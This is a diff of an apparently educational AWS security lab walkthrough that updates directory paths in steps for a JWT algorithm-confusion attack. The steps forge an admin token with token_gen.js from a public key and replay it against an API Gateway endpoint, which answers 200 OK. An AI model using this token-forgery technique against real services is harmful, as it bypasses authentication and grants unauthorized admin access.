@@ -48,10 +48,12 @@
      
 ##### Step 8:
 
+* **cd** into `cd /home/vagrant/Desktop/Labs/AWS-Security-Training/lambda/Broken-Access-Control/Algorithm-Confusion`
+
 * Run `touch public_key.pem`
 
     ```commandline
-    root@we45-VirtualBox:/home/we45# touch public_key.pem
+    root@we45-VirtualBox:/home/vagrant/Desktop/Labs/AWS-Security-Training/lambda/Broken-Access-Control/Algorithm-Confusion# touch public_key.pem
     ```
 ##### Step 9:
 
@@ -70,7 +72,7 @@
         
 
     ```commandline
-    root@we45-VirtualBox:/home/we45# node token_gen.js --file public_key.pem --username admin
+    root@we45-VirtualBox:/home/vagrant/Desktop/Labs/AWS-Security-Training/lambda/Broken-Access-Control/Algorithm-Confusion# node token_gen.js --file public_key.pem --username admin
         
     This is your token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODk1Mjc0fQ.XFhJRm1W_58ulrgVJ9_vy7LsGy14VICXCLMQsh8g-nE
     
@@ -81,7 +83,7 @@
 * Run `http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:<copied token>`
 
     ```commandline
-    root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODgwMjg2fQ.29E-i4QD21pvpA41oEJx60haJoOpgqbpzbvE6OK-Exg
+    root@we45-VirtualBox:/home/vagrant/Desktop/Labs/AWS-Security-Training/lambda/Broken-Access-Control/Algorithm-Confusion# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODgwMjg2fQ.29E-i4QD21pvpA41oEJx60haJoOpgqbpzbvE6OK-Exg
     HTTP/1.1 200 OK
     Access-Control-Allow-Credentials: true
     Access-Control-Allow-Headers: Content-Type,Authorization,X-Amz-Date,X-Api-Key,X-Amz-Security-Token
